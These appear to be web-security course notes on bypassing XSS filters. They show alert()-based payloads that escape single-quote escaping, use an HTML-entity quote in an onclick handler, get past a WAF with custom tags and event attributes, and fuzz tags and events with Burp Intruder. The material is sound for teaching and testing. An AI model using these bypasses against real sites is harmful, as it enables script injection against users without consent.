# Section 11: XSS - Bypassing Security

## Bypassing Single-Quotes filtering

Reflected XSS

Example: Search text term is injected in JS code

If a single quote is escaped with backward slash, before the single quote:

```
y = 'some string'

x = 'someone\'s name'
```

So a single quote cannot be used to break out of the string and run JS code, because it is escaped

Payload:

```
\';alert(22);//
```

now the backward slash is escaped (with the added backward slash in the start of the payload)

---

## Bypassing Advanced Filtering

Stored XSS

Example: A comment in a blog with a website, the website is injected in an anchor tag on the onclick event

Payload:
```
https://google.com\');alert(44);//
```

but now also the backward slash is escaped with double backslash

<b>Solution</b>: write single quote differently

Payload:
```
https://google.com&apos;);alert(44);//
```

---

## Bypassing Server-Side Filtering

Example: Application protected by WAF (Web Application Firewall)

WAF is filtering all HTML / script tags (HTML injection is not possible)

can try
```
<scRipt>spider</scriPt>
```

but cannot bypass it with capitalized letters either, all tags disallowed

can run:

```
<bla>spider</bla>
```

can use HTML attributes to inject JS code

```
<bla onfocus=alert(2) tabindex=1>spider</bla>
```

---

## Using Burp Intruder

Send Search Request to Intruder,

In Payload Options of Intruder, paste all possible HTML tags from cheat sheat

and modify search

```
GET /?search=<$$>
```

Burp will substitute the two S's with every single item in the list

Found that `body` is not filtered, new search for:

```
GET /?search=<body%20$$>
```

and new Payload options list is now all possible events 

https://portswigger.net/web-security/cross-site-scripting/cheat-sheet

found out that onresize responds, new payload is:

```
<body onresize=alert(3)>test</body>
```

---



